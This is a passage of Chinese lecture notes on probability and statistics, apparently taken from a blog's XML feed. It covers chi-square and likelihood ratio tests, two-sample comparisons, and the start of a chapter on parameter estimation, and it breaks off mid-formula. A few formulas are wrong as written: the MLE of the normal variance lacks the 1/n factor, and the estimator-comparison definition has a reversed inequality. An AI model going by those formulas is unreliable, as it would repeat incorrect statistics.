$\ll 0.001$.</p></li></ul><h2 id="拟合优度检验"><a href="#拟合优度检验" class="headerlink" title="拟合优度检验"></a>拟合优度检验</h2><ul><li><p><strong>定义(Pearson 卡方统计量)</strong><br>  $$<br>  \chi^2:=\sum_{i=1}^{k}\dfrac{(O_i-E_i)^2}{E_i}\stackrel{近似}{\sim}\chi^2(k-1).<br>  $$<br>  其中 $O_i$ 为观测频数, $E_i$ 为期望频数 ($H_0$ 真的条件下).</p></li><li><p><strong>定理</strong>  $H_0: P(X\in$ 第 $i$ 单元$)=p_i(1\le i\le k)$. 若 $H_0$ 为真, 当 $n\rightarrow\infty$ 时, 有<br>  $$<br>  \chi^2\rightarrow\chi^2(k-1).<br>  $$</p></li><li><p><strong>例</strong>  投掷一枚骰子 60 次.</p><table><thead><tr><th>点数</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>总计</th></tr></thead><tbody><tr><td>观测频数</td><td>4</td><td>6</td><td>17</td><td>16</td><td>8</td><td>9</td><td>60</td></tr><tr><td>期望频数</td><td>10</td><td>10</td><td>10</td><td>10</td><td>10</td><td>10</td><td>60</td></tr></tbody></table><p>  $H_0:$ 分布均匀, $H_1:$ 分布不均匀.</p></li><li><p><strong>解答</strong>  检验统计量的观测值:<br>  $$<br>  \dfrac{(4-10)^2}{10}+\dfrac{(6-10)^2}{10}+\cdots+\dfrac{(9-10)^2}{10}=14.2.<br>  $$<br>  自由度为 $6-1=5$. <strong>P</strong> 值 $=P_{H_0}(\chi^2\ge 14.2)\approx 0.014$.</p></li><li><p><strong>注</strong>  在实际应用中, 需要满足 $E_i=nP_i\ge 5$, 才能较好使用 <strong>Pearson</strong> 定理.</p></li><li><p><strong>例(列联表独立性检验)</strong>  对某项议题态度与年龄段是否独立.</p><table><thead><tr><th></th><th>青年</th><th>中年</th><th>老年</th><th></th></tr></thead><tbody><tr><td>支持</td><td>20</td><td>40</td><td>20</td><td>80</td></tr><tr><td>反对</td><td>30</td><td>30</td><td>10</td><td>70</td></tr><tr><td></td><td>50</td><td>70</td><td>30</td><td>150</td></tr></tbody></table><p>  $H_0:$ 独立, $H_1:$ 不独立.</p></li><li><p><strong>解答</strong>  $P_{ij}=P_{i+}P_{+j}$, 其中 $P_{i+}$, $P_{+j}$ 称为边际概率.</p><p>  在 $H_0$ 为真前提下估计 $P_{ij}$. <strong>MLE</strong>:<br>  $$<br>  P_{ij}^*=(P_{i+}P_{+j})^*=P_{i+}^<em>P_{+j}^</em>=\dfrac{sum(row_i)}{n}\times\dfrac{sum(column_j)}{n}.<br>  $$<br>  得到<br>  $$<br>  E_{ij}=nP_{ij}\approx nP_{ij}^*=\dfrac{1}{n}sum(row_i)\times sum(column_j).<br>  $$<br>  计算得检验统计量观测值为 6.12, 自由度为 $(a-1)(b-1)=2$.</p><p>  得到 <strong>P</strong> 值 $=P_{H_0}(\chi^2\ge 6.12)\approx 0.0469$.</p></li><li><p><strong>注</strong>  对于 $a$ 行 $b$ 列, 当 $H_0$ 成立时, 其未知参数个数为 $s=(a-1)+(b-1)$.</p><p>  因此卡方自由度为:<br>  $$<br>  ab-1-s=ab-1-(a-1)-(b-1)=(a-1)(b-1).<br>  $$</p></li></ul><h2 id="似然比检验"><a href="#似然比检验" class="headerlink" title="似然比检验"></a>似然比检验</h2><ul><li><p><strong>例</strong>  两种硬币 ($p=0.5$, $p=0.7$) 投掷 $n=10$ 次, 正面向上 $X=x$ 次. 提出假设 $H_0:p=0.5$ v.s. $p=0.7$. 考虑<br>  $$<br>  \dfrac{P_{H_0}(X=x)}{P_{H_1}(X=x)}\le c\leftrightarrow x 的范围<br>  $$<br>  我们需要控制<br>  $$<br>  P_{H_0}\Big(似然比\le c\Big)\le\alpha.<br>  $$</p></li><li><p><strong>注</strong></p><ul><li>当 $H_0$, $H_1$ 均为简单假设时 (<strong>N-P</strong>), 证明: 似然比检验最优 (功效最大).</li><li>当 $H_0$, $H_1$ 不全为简单假设时, 似然比检验一般不最优, 但通常表现不错.</li></ul></li><li><p><strong>定义(广义似然比)</strong>  $H_0:\theta\in\Theta_0$ v.s. $H_1:\theta\in\Theta_1$, $X_1,\cdots,X_n$ 为随机样本.</p><p>  考虑广义似然比<br>  $$<br>  \Lambda^*:=\dfrac{\sup_{\theta\in\Theta_0}L(\theta)}{\sup_{\theta\in\Theta_1}L(\theta)}<br>  $$<br>  基于技术原因, 检验统计量选为<br>  $$<br>  \Lambda:=\dfrac{\sup_{\theta\in\Theta_0}L(\theta)}{\sup_{\theta\in\Theta_0\cup\Theta_1}L(\theta)}=\min{\Lambda^*,1}=\Lambda(X_1,\cdots,X_n).<br>  $$<br>  $\Lambda$ 越小则越反对 $H_0$ (拒绝域的形状). 选择 $\lambda_0$ 使<br>  $$<br>  P_{H_0}(\Lambda\le\lambda_0)\le\alpha.<br>  $$<br>  至此得到了检验准则.</p></li><li><p><strong>定理</strong>  在一定(光滑性)条件下, 当 $n\rightarrow\infty$ 时, 在 $H_0$ 为真前提下:<br>  $$<br>  -2\log\Lambda\rightarrow\chi^2(d).<br>  $$<br>  其中自由度 $d=\dim(\Theta_0\cup\Theta_1)-\dim(\Theta_0)$. 这里的 $\dim$ 指自由参数的个数.</p></li><li><p><strong>例(多项分布检验)</strong>  $H_0:p_1=p_1^*$, $\cdots$, $p_k=p_k^*$, 观测频数分别为 $n_1,\cdots,n_k$.</p></li><li><p><strong>解答</strong>  得到<br>  $$<br>  L(p_1,\cdots,p_k)=C_n^{n_1,\cdots,c_k}p_1^{n_1}\cdots p_k^{n_k}.<br>  $$<br>  因此<br>  $$<br>  \Lambda=\dfrac{\sup_{\theta\in\Theta_0}L(\theta)}{\sup_{\theta\in\Theta_0\cup\Theta_1}L(\theta)}=\dfrac{L(p_1^0,\cdots,p_k^0)}{L(p_1^*,\cdots,p_k^*)}.<br>  $$<br>  已知<br>  $$<br>  n_i=np_i^*,E_i=np_i^0,O_i=n_i.<br>  $$<br>  且<br>  $$<br>  x\log\dfrac{x}{x_0}\stackrel{Taylor}{=}0+(x-x_0)+\dfrac{1}{2}\dfrac{(x-x_0)^2}{x_0}+\cdots<br>  $$<br>  计算得<br>  $$<br>  \begin{aligned}<br>  -2\log\Lambda&amp;=-2\sum_{i=1}^{k}\log\big(\dfrac{p_i^0}{p_i^*}\big)^{n_i}\<br>  &amp;=-2\sum_{i=1}^{k}n_i\log\dfrac{p_i^0}{p_i^*}\<br>  &amp;=2\sum_{i=1}^{k}O_i\log\dfrac{O_i}{E_i}\<br>  &amp;=\sum_{i=1}^{k}\dfrac{(O_i-E_i)^2}{E_i}+\cdots.<br>  \end{aligned}<br>  $$<br>  考虑到 $\dim(\Theta_0)=0$, $\dim(\Theta_0\cup\Theta_1)=k-1$, 因此给出<br>  $$<br>  \sum_{i=1}^{k}\dfrac{(O_i-E_i)^2}{E_i}\stackrel{近似}{\sim}\chi^2(k-1).<br>  $$</p></li></ul><h2 id="两独立总体比较"><a href="#两独立总体比较" class="headerlink" title="两独立总体比较"></a>两独立总体比较</h2><ul><li><p>两独立总体:</p><table><thead><tr><th>总体</th><th>均值</th><th>方差</th><th>样本 (iid)</th></tr></thead><tbody><tr><td>$X$</td><td>$\mu_1$</td><td>$\sigma_1^2$</td><td>$X_1,\cdots,X_n$</td></tr><tr><td>$Y$</td><td>$\mu_2$</td><td>$\sigma_2^2$</td><td>$Y_1,\cdots,Y_m$</td></tr></tbody></table></li><li><p><strong>定义(比较均值)</strong>:</p><p>  给出 $E(\overline{X}-\overline{Y})=\mu_1-\mu_2$, $Var(\overline{X}-\overline{Y})=\dfrac{\sigma_1^2}{n}+\dfrac{\sigma_2^2}{m}=se^2$. 参考置信区间部分.</p></li><li><p><strong>定理</strong>  给出 $W_1\sim\chi^2(k_1)$, $W_2\sim\chi^2(k_2)$, 且 $W_1,W_2$ 独立, 我们有<br>  $$<br>  \dfrac{W_1/k_1}{W_2/k_2}\sim F(k_1,k_2).<br>  $$</p></li><li><p><strong>定义(比较方差)</strong>: 假设 $X$, $Y$ 均为正态. 提出假设 $H_0:\sigma_1^2=\sigma_2^2$ v.s. $H_1:\sigma_1^2\ne\sigma_2^2$.<br>  $$<br>  \dfrac{(n-1)S_1^2}{\sigma_1^2}\sim\chi^2(n-1), \dfrac{(m-1)S_2^2}{\sigma_2^2}\sim\chi^2(m-1).<br>  $$<br>  考虑检验统计量(依赖于<strong>样本</strong>或<strong>已知参数</strong>)<br>  $$<br>  \dfrac{S_1^2}{S_2^2}.<br>  $$<br>  当 $H_0$ 为真时, 有<br>  $$<br>  \dfrac{S_1^2}{S_2^2}\sim F(n-1,m-1).<br>  $$<br>  检验准则为当<br>  $$<br>  \dfrac{S_1^2}{S_2^2}\ge F_{\tfrac{\alpha}{2}}(n-1,m-1),或,\dfrac{S_1^2}{S_2^2}\le F_{1-\tfrac{\alpha}{2}}(n-1,m-1)<br>  $$<br>  时拒绝原假设.</p></li><li><p><strong>注</strong>  由定义 $F_{1-\tfrac{\alpha}{2}}(n-1,m-1)=\dfrac{1}{F_{\tfrac{\alpha}{2}}(m-1,n-1)}$.</p></li><li><p><strong>例(比较成功率/失败率)</strong>  阿司匹林对降低心脏病发病率的有效性.</p><table><thead><tr><th></th><th>心脏病发作</th><th>心脏病未发作</th><th>合计</th><th>发作率</th></tr></thead><tbody><tr><td>阿司匹林</td><td>139</td><td>10898</td><td>11037</td><td>0.0126</td></tr><tr><td>安慰剂</td><td>239</td><td>10795</td><td>11034</td><td>0.0217</td></tr></tbody></table><p>  提出假设 $H_0:p_1=p_2$ (无效) v.s. $H_1:p_1&lt;p_2$ (有效), 检验统计量为 $P_1-P_2$.</p><p>  容易得到 $E(P_1-P_2)=p_1-p_2$, $Var(P_1-P_2)=\dfrac{p_1(1-p_1)}{n_1}+\dfrac{p_2(1-p_2)}{n_2}$.</p><p>  那么<br>  $$<br>  \dfrac{(P_1-P_2)-(p_1-p_2)}{se}\stackrel{近似}{\sim}N(0,1).<br>  $$<br>  在 $H_0$ 为真前提下, 有<br>  $$<br>  se^2=p(1-p)(\dfrac{1}{n_1}+\dfrac{1}{n_2})\approx p^*(1-p^*)(\dfrac{1}{n_1}+\dfrac{1}{n_2}).<br>  $$<br>  其中 $p^*=\dfrac{k_1+k_2}{n_1+n_2}$, 得 $se^2\approx\hat{se}^2=0.00175^2$. 结合 $\dfrac{P_1-P_2}{\hat{se}}\stackrel{近似}{\sim}N(0,1)$, 得 <strong>P</strong> 值<br>  $$<br>  P\Big(\dfrac{P_1-P_2}{\hat{se}}\le\dfrac{0.0126-0.0217}{0.00175}\Big)\approx P(Z\le -5.20)\approx 10^{-7}.<br>  $$<br>  因此有理由拒绝 $H_0$.</p></li><li><p><strong>注</strong></p><ul><li>随机分组.</li><li>双盲实验.</li><li>$n$ 充分大.</li></ul></li><li><p><strong>例(行驶里程)</strong>  比较两种油 <strong>A</strong> 与 <strong>B</strong> 的行驶里程.</p><table><thead><tr><th></th><th>样本容量</th><th>平均里程</th><th>样本标准差</th></tr></thead><tbody><tr><td>油 <strong>A</strong></td><td>50</td><td>25</td><td>5.00</td></tr><tr><td>油 <strong>B</strong></td><td>50</td><td>26</td><td>4.00</td></tr></tbody></table><p>  提出假设 $H_0:\mu_A=\mu_B$ v.s. $H_1:\mu_A\ne\mu_B$, 检验统计量为 $\overline{X}_A-\overline{X}_B$.</p><p>  在 $H_0$ 为真前提下, 有<br>  $$<br>  \dfrac{\overline{X}_A-\overline{X}_B}{\sqrt{\tfrac{S_1^2}{n_1}+\tfrac{S_2^2}{n_2}}}\sim N(0,1).<br>  $$<br>  其中 $\hat{se}\approx 0.905$. 得 <strong>P</strong> 值<br>  $$<br>  P\Big(\vert\dfrac{\overline{X}_A-\overline{X}_B}{\hat{se}}\vert\ge\vert\dfrac{25-26}{0.905}\vert\Big)\approx P(\vert Z\vert\ge 1.1)\approx 0.2714.<br>  $$<br>  认为哪种油行驶里程更长的理由均不充分.</p></li></ul><h2 id="两相关总体比较"><a href="#两相关总体比较" class="headerlink" title="两相关总体比较"></a>两相关总体比较</h2><ul><li><p><strong>例(行驶里程-改进)</strong>  同一辆车不同日子加不同油, 记录行驶里程.</p><table><thead><tr><th>车号</th><th>油 A</th><th>油 B</th><th>差异 ($d_i$)</th></tr></thead><tbody><tr><td>1</td><td>27.01</td><td>26.95</td><td>0.06</td></tr><tr><td>2</td><td>20.00</td><td>20.44</td><td>-0.44</td></tr><tr><td>$\cdots$</td><td>$\cdots$</td><td>$\cdots$</td><td>$\cdots$</td></tr><tr><td>10</td><td>25.22</td><td>26.01</td><td>-0.79</td></tr><tr><td>均值</td><td>25.20</td><td>25.80</td><td>-0.60</td></tr><tr><td>标准差</td><td>4.27</td><td>4.10</td><td>0.61</td></tr></tbody></table><p>  提出假设 $H_0:\mu_d=0$ v.s. $H_1:\mu_d\ne 0$, 检验统计量为 $\overline{d}$.</p><p>  假设 $d_i$ 服从正态分布. 在 $H_0$ 为真前提下, 有<br>  $$<br>  \dfrac{\overline{d}}{\tfrac{S_d}{\sqrt{n}}}\sim t(n-1).<br>  $$<br>  得 <strong>P</strong> 值<br>  $$<br>  P\Big(\vert t(9)\vert\ge\vert\dfrac{-0.60}{\tfrac{0.61}{\sqrt{10}}}\vert\Big)\approx 0.012.<br>  $$<br>  有理由拒绝 $H_0$, 两种油的行驶里程有差距.</p></li><li><p><strong>注</strong>  假设检验不能检验试验设计, 仅对数据负责; 功能有限, 作为决策辅助.</p></li></ul><h2 id="Bayes-假设检验"><a href="#Bayes-假设检验" class="headerlink" title="Bayes 假设检验"></a>Bayes 假设检验</h2><ul><li><p><strong>例</strong>  两种硬币 ($p=0.5$, $p=0.7$) 投掷 $n=10$ 次, 正面向上 $X=x$ 次. 提出假设 $H_0:p=0.5$ v.s. $p=0.7$​. 考虑<br>  $$<br>  \dfrac{P(H_0\mid x)}{P(H_1\mid x)}=\dfrac{P(H_0)P(x\mid H_0)}{P(H_1)P(x\mid H_1)}&lt;1<br>  $$<br>  则拒绝 $H_0$.</p></li><li><p><strong>注</strong>  给出一个特别的例子, $H_0:\theta=\theta_0$, $\Theta$ 连续. 则 $P(H_0\mid x)=0$, 此时似乎总是会拒绝 $H_0$? (陈书 <strong>Chap 5.28</strong>)</p></li></ul><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><h3 id="决策"><a href="#决策" class="headerlink" title="决策"></a>决策</h3><ul><li>拒绝 $H_0$ 或不拒绝 $H_0$.</li><li>检验=决策准则 $\Leftrightarrow$ 拒绝域 $R$ 的划分.</li><li>关键:<ul><li>选择合适的检验统计量.</li><li>确定拒绝域的形状 (由 $H_1$ 决定).</li></ul></li><li>拒绝 $H_0$ 有时也称观测值是显著的.</li></ul><h3 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h3><ul><li><p>统计学中没有绝对的证实或证伪.<br>  $$<br>  \alpha(R):=P_{\theta}((X_1,\cdots,X_n)\in R\mid H_0).\<br>  \beta(R):=P_{\theta}((X_1,\cdots,X_n)\in R^c\mid H_1).<br>  $$</p></li><li><p>检验程序的属性, 不是样本的属性. 样本做决策要么正确要么错误.<br>  $$<br>  \alpha(R)\le\alpha.\<br>  \beta(R)\le\beta.<br>  $$<br>  预先指定的可接受的长期错误率.</p></li></ul><h3 id="显著性检验-v-s-Neyman-Pearson-检验"><a href="#显著性检验-v-s-Neyman-Pearson-检验" class="headerlink" title="显著性检验 v.s. Neyman-Pearson 检验"></a>显著性检验 v.s. Neyman-Pearson 检验</h3><ul><li><p>显著性检验: 只控制 $\alpha(R)\le\alpha$.</p></li><li><p><strong>Neyman-Pearson</strong> 假设检验: 强调两类错误、功效, $H_0,H_1$ 地位不均等.</p></li><li><p>不拒绝 $H_0$ $\ne$ 接受 $H_0$.</p></li><li><p>$\beta(R)$ 越小 (功效越大), 当 $H_0$ 不真时, 越有可能拒绝 $H_0$; 当观测支持 $H_0$, 则可以接受 $H_0$.</p></li><li><p>若忽略了对 $\beta(R)$ 的系统控制 (常见情形), 将导致对结果及下一步工作方向的误判.</p></li><li><p><strong>例</strong>  $H_0:\mu\ge 5$, $H_1:\mu&lt;5$. $n=10$, $\sigma=0.01$, $\alpha=0.01$.</p></li><li><p><strong>解答</strong>  临界值<br>  $$<br>  c=\mu_0-Z_{\alpha}\dfrac{\sigma}{\sqrt{n}}\approx 4.993.<br>  $$</p></li></ul><h3 id="P-值"><a href="#P-值" class="headerlink" title="P 值"></a>P 值</h3><ul><li>一次具体的观测值没有概率可言, <strong>P</strong> 不能衡量决策错误的概率. (<strong>ASA</strong> 文章)</li></ul><h3 id="卡方检验-——-多项分布的检验"><a href="#卡方检验-——-多项分布的检验" class="headerlink" title="卡方检验 —— 多项分布的检验"></a>卡方检验 —— 多项分布的检验</h3><ul><li><strong>例</strong>  $H_0: p_1=p$, $p_2=1-p$. 此时<br>  $$<br>  \begin{aligned}<br>  \chi^2&amp;=\dfrac{(O_1-np_1)^2}{np_1}+\dfrac{(O_2-np_2)^2}{np_2}\<br>  &amp;=\dfrac{(O_1-np)^2}{np}+\dfrac{(O_1-np)^2}{n(1-p)}\<br>  &amp;=\dfrac{(O_1-np)^2}{np(1-p)}\<br>  &amp;\stackrel{近似}{\sim} N^2(0,1)=\chi^2(1).<br>  \end{aligned}<br>  $$</li></ul><h3 id="统计显著-ne-实际显著"><a href="#统计显著-ne-实际显著" class="headerlink" title="统计显著 $\ne$ 实际显著"></a>统计显著 $\ne$ 实际显著</h3><ul><li><p><strong>例</strong>  投掷骰子 $n=6\times 10^{10}$ 次​.</p><table><thead><tr><th>点数</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>总计</th></tr></thead><tbody><tr><td>观测频数 $10^{10}$</td><td>$-10^{6}$</td><td>$1.5\times 10^{6}$</td><td>$-2\times 10^{6}$</td><td>$4\times 10^{6}$</td><td>$-3\times 10^{6}$</td><td>$0.5\times 10^{6}$</td><td>$6\times 10^{10}$</td></tr></tbody></table><p>  $H_0:$ 分布均匀, $H_1:$ 分布不均匀. </p></li><li><p>计算得到 $\chi^2=3250$, 此时 <strong>P</strong> 值 $\ll 0.0001$. 因此拒绝 $H_0$, 统计显著. </p></li><li><p>实际上 $\vert\hat p_i-\dfrac{1}{6}\vert\sim 10^{-4}$, 实际角度视为无差异, 实际不显著.</p></li><li><p>$n$ 过大, 明察秋毫; $\chi^2$ 统计量关于 $n$ 是非齐次的.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记6</title>
      <link href="/51/"/>
      <url>/51/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-6-参数估计"><a href="#Chap-6-参数估计" class="headerlink" title="Chap 6 参数估计"></a>Chap 6 参数估计</h1><ul><li><p><strong>引入</strong>  检测某厂一大批电子元件寿命指标是否合格.</p></li><li><p><strong>总体</strong></p><ul><li>所需检测的电子元件寿命;</li><li>统计分析问题中研究的对象全体的某个数字特征 $X$.</li><li>元件寿命的分布;</li><li>变量 $X$ 的分布.</li></ul></li><li><p><strong>统计总体</strong>  一个概率分布.</p></li><li><p><strong>注</strong></p><ul><li>有限总体;</li><li>无限总体.</li></ul></li><li><p><strong>统计模型</strong></p><ul><li>一族概率分布;</li><li>参数模型 (正态模型);</li><li>非参数模型.</li></ul></li><li><p><strong>样本</strong></p><ul><li>$(X_1,\cdots,X_n)$, 其中 $X_i$ 来自总体 $X$, $n$ 为样本容量;</li><li>获取方式:<ul><li>试验;</li><li>观察 (完全 / 不完全).</li></ul></li></ul></li><li><p><strong>简单随机抽样</strong></p><ul><li>总体个数 $N$ 有限;</li><li>无放回;</li><li>容量为 $n$ 的样本抽取出来的概率为 $p=\dfrac{1}{C_N^n}$.</li></ul></li><li><p><strong>随机样本</strong></p><ul><li>$X_1,\cdots,X_n$ 独立同分布, 例: 有放回 / 近似有放回 ($n&lt;&lt;N$).</li></ul></li><li><p><strong>统计量</strong></p><ul><li><p>$T(X_1,\cdots,X_n)$ - 完全由样本决定, 是一种数据简化方式.</p></li><li><p>样本均值<br>  $$<br>  \overline{X}=\dfrac{1}{n}\sum_{i=1}^{n}X_i.<br>  $$</p></li><li><p>样本方差<br>  $$<br>  S^2=\dfrac{1}{n-1}\sum_{i=1}^{n}(X_i-\overline{X})^2.<br>  $$</p></li></ul></li><li><p><strong>统计推断</strong></p><ul><li>总体为因, 样本为果;</li><li>总体决定样本, 样本推断总体;</li><li>经典方法 (频率) v.s. <strong>Bayes</strong>方法.</li><li><strong>例</strong>  $Y_i=aX_i+\varepsilon_i$.<ul><li>求 $a$. $(X_i,Y_i)(1\le i\le n)\rightarrow a\approx\hat{a}$ (模型推断 参数估计)</li><li>已知 $a=\hat{a}$, 观测到 $Y_i$, 求 $X_i$ (变量推断)</li></ul></li><li><strong>例</strong>  元件寿命.<ul><li>假设 $X\sim Exp(\lambda)$, 求 $\lambda$ (参数估计)</li><li>假设合格标准 $E(X)\ge L$, 需建立可操作的检验标准: $X\ge l$, $\mu$ 未知, 求 $l$ (假设检验)</li></ul></li></ul></li></ul><h2 id="矩估计"><a href="#矩估计" class="headerlink" title="矩估计"></a>矩估计</h2><ul><li><p><strong>定义(样本矩)</strong>  $X_1,\cdots,X_n$ 独立同分布, 定义其 $k$ 阶<strong>原点矩</strong>:<br>  $$<br>  a_k=\dfrac{1}{n}\sum_{i=1}^{n}X_i^k\stackrel{\textbf{LLN}}{\longrightarrow}E(X^k).<br>  $$<br>  其 $k$ 阶<strong>中心矩</strong>:<br>  $$<br>  m_k=\dfrac{1}{n}\sum_{i=1}^{n}(X_i-\overline{X})^k\stackrel{\textbf{LLN}}{\longrightarrow}E\Big[(X-\mu)^k\Big].<br>  $$</p></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$. 考虑其均值、方差对应的样本矩.</p></li><li><p><strong>解答</strong><br>  $$<br>  \mu=E(X)\approx\overline{X}=a_1;\<br>  \sigma^2=E\Big[(X-\mu)^2\Big]\approx\dfrac{1}{n}\sum_{i=1}^{n}(X_i-\overline{X})^2=m_2.<br>  $$</p></li><li><p><strong>例</strong>  $X\sim Exp(\lambda)$. 考虑其均值、方差对应的样本矩, 并给出 $\lambda$ 的矩估计.</p></li><li><p><strong>解答</strong><br>  $$<br>  \dfrac{1}{\lambda}=E(X)\approx\overline{X}=a_1\Rightarrow\lambda=\dfrac{1}{a_1};\<br>  \dfrac{1}{\lambda^2}=E\Big[(X-E(X))^2\Big]\approx\dfrac{1}{n}\sum_{i=1}^{n}(X_i-\overline{X})^2=m_2\Rightarrow\lambda=\Big(\dfrac{1}{m_2}\Big)^{\tfrac{1}{2}}.<br>  $$<br>  我们通常使用<strong>低阶矩</strong>进行估计.</p></li></ul><h2 id="极大似然估计-MLE"><a href="#极大似然估计-MLE" class="headerlink" title="极大似然估计 (MLE)"></a>极大似然估计 (MLE)</h2><ul><li><p><strong>定义(似然函数)</strong>  假设 $X_1,\cdots,X_n$ 的联合分布 $f(x_1,\cdots,x_n;\theta)$ (<strong>PMF\PDF</strong>), 其中 $\theta$ 为参数. 对于观测 $(X_1,\cdots,X_n)$ 的似然函数为<br>  $$<br>  L(\theta):=f(X_1,\cdots,X_n;\theta).<br>  $$</p></li><li><p><strong>注</strong></p><ul><li><p>具体观测数据通常记为 $(x_1,\cdots,x_n)$, 视为 $(X_1,\cdots,X_n)$ 的具体的实现值;</p></li><li><p>离散情形下, $L(\theta)$ 为出现 $(X_1,\cdots,X_n)$ 的概率;</p></li><li><p>若 $X_1,\cdots,X_n$ 独立同分布, 总体分布为 $f_1(x;\theta)$ (<strong>PMF\PDF</strong>), 那么<br>  $$<br>  L(\theta)=f_1(X_1;\theta)f_1(X_2;\theta)\cdots f_1(X_n;\theta).<br>  $$</p></li></ul></li><li><p><strong>例</strong>  $X_i\sim N(\mu,\sigma^2)$ 独立同分布, 其中 $\mu$,$\sigma^2$ 未知. 考虑观测的似然函数.</p></li><li><p><strong>解答</strong><br>  $$<br>  L(\mu,\sigma^2)=\prod_{i=1}^{n}\Big(\dfrac{1}{\sqrt{2\pi}\sigma}e^{-\tfrac{(X_i-\mu)^2}{2\sigma^2}}\Big).<br>  $$</p></li><li><p><strong>定义(MLE)</strong>  定义 $\theta$ 的 <strong>MLE</strong> 为<br>  $$<br>  \theta^{<em>}=\arg\max_{\theta}L(\theta).<br>  $$<br>  其中 $\theta^{</em>}=\theta^{*}(X_1,\cdots,X_n)$.</p></li><li><p><strong>解答续</strong>  考虑方程组<br>  $$<br>  \begin{cases}<br>  \dfrac{\partial\log L(\mu,\sigma^2)}{\partial\mu}=0;\<br>  \dfrac{\partial\log L(\mu,\sigma^2)}{\partial\sigma^2}=0.<br>  \end{cases}<br>  $$<br>  解得<br>  $$<br>  \begin{cases}<br>  \mu^{<em>}=\overline{X},\<br>  (\sigma^2)^{</em>}=\sum\limits_{i=1}^{n}(X_i-\overline{X})^2.<br>  \end{cases}<br>  $$<br>  经验证 $(\mu^{<em>},(\sigma^2)^{</em>})$ 为 $(\mu,\sigma^2)$ 的 <strong>MLE</strong>.</p></li><li><p><strong>注</strong>  $(\sigma^2)^{<em>}=(\sigma^{</em>})^2$ (<strong>MLE</strong> 的不变性).</p></li><li><p><strong>例</strong>  随机变量 $X_i\sim U(0,\theta)$ 独立同分布, $\theta$ 未知. 求 $\theta$ 的 <strong>MLE</strong>.</p></li><li><p><strong>解答</strong><br>  $$<br>  L(\theta)=<br>  \begin{cases}<br>  \cfrac{1}{\theta^n}, &amp;X_i\in(0,\theta), \theta\ge\max{X_1,\cdots,X_n}\<br>  0, &amp;其他.<br>  \end{cases}<br>  $$<br>  我们得到<br>  $$<br>  \theta^{*}=\max{X_1,\cdots,X_n}.<br>  $$</p></li><li><p><strong>例</strong>  总体 <strong>PDF</strong> 为 $f(x;\theta)=\dfrac{1}{\pi(1+(x-\theta)^2)}$, $x\in\mathbb{R}$ (<strong>Cauchy</strong> 分布).</p></li><li><p><strong>解答</strong></p><ul><li>无矩 $\Rightarrow$ 无矩估计;</li><li>似然方程 $\sum\limits_{i=1}^{n}\dfrac{X_i-\theta}{1+(X_i-\theta)^2}=0$, 不易求解;</li><li>合理估计, $\hat{\theta}$ 为样本中位数.</li></ul></li></ul><h2 id="优良性准则"><a href="#优良性准则" class="headerlink" title="优良性准则"></a>优良性准则</h2><ul><li><p><strong>定义(无偏性)</strong>  定义 $\hat{\theta}=\hat{\theta}(X_1,\cdots,X_n)$ 为 $\theta$ 的估计量 (随机变量). 我们称一个估计 $\hat\theta$ 的偏差 (<strong>Bias</strong>):<br>$$<br>E_{\theta}(\hat\theta-\theta)=E_{\theta}(\hat\theta)-\theta.<br>$$<br>若 $E_{\theta}(\hat\theta-\theta)=0$, $\forall,\theta$, 则称 $\hat\theta$ 为 $\theta$ 的一个无偏估计量.</p></li><li><p><strong>注</strong></p><ul><li>一般地, $E_{\theta}(\hat g(X_1,\cdots,X_n)-g(\theta))=0$, $\forall,\theta,\Leftrightarrow$ $\hat{g}$ 为 $g(\theta)$ 的无偏估计;</li><li>无偏 $\Leftrightarrow$ 无系统偏差;</li><li>$\dfrac{1}{N}\sum\limits_{m=1}^{N}\hat{\theta}(X_1^{(m)},\cdots,X_n^{(m)})\stackrel{a.s.}{\longrightarrow}E(\hat\theta)\stackrel{无偏}{=}\theta$;</li><li>无偏性的重要性视情形而定.</li></ul></li><li><p><strong>例</strong>  $E(X)=\mu$, $Var(X)=\sigma^2$.</p></li><li><p><strong>解答</strong></p><ul><li>$E(\overline{X})=\mu\Rightarrow \overline{X}$ 为 $\mu$ 的无偏估计;</li><li>$E(m_2)=E\Big(\dfrac{1}{n}\sum\limits_{i=1}^{n}(X_i-\overline{X})^2\Big)=\dfrac{n-1}{n}\sigma^2$;</li><li>$E(S^2)=E\Big(\dfrac{1}{n-1}\sum\limits_{i=1}^{n}(X_i-\overline{X})^2\Big)=\sigma^2$.</li></ul></li><li><p><strong>例</strong>  $X_i\stackrel{iid}{\sim}U(0,\theta)$.</p></li><li><p><strong>解答</strong></p><ul><li>矩估计 $\hat\theta=2\overline{X}$;</li><li><strong>MLE</strong> $\theta^{*}=\max{X_1,\cdots, X_n}$;</li><li>计算可得 $E(\hat\theta)=\theta,,E(\theta^{*})=\dfrac{n}{n+1}\theta$.</li></ul></li><li><p><strong>注</strong>  <strong>MLE</strong> 可也能是有偏的 (本例中即为系统偏小).</p></li><li><p><strong>定义(均方误差准则)</strong>  定义一个估计 $\hat\theta$ 的均方误差 (<strong>MSE</strong>):<br>  $$<br>  E_{\theta}\Big[(\hat\theta-\theta)^2\Big]=Var(\hat\theta)+E_{\theta}^2(\hat\theta-\theta).<br>  $$<br>  其中 $Var(\hat\theta)$ 代表着精确度, $E_{\theta}^2(\hat\theta-\theta)$ 代表着准确度.</p></li><li><p><strong>定义</strong>  假定 $\hat\theta_1$, $\hat\theta_2$ 均为 $\theta$ 的无偏估计, 若<br>  $$<br>  \forall,\theta,,Var(\hat\theta_1)\le Var(\hat\theta_2)<br>  $$<br>  且<br>  $$<br>  \exists,\theta_0,,Var_{\theta_0}(\hat\theta_2)&lt;Var_{\theta_0}(\hat\theta_1).<br>  $$<br>  则称在均方误差意义下 $\hat\theta_1$ 优于 $\hat\theta_2$.</p></li><li><p><strong>例</strong>  $E(X)=\mu$.</p></li><li><p><strong>解答</strong><br>  $$<br>  E(\overline{X})=E(X_1)=E\Big(\dfrac{1}{2}X_1+\dfrac{1}{2}X_2\Big)=\mu.<br>  $$</p><p>  $$<br>  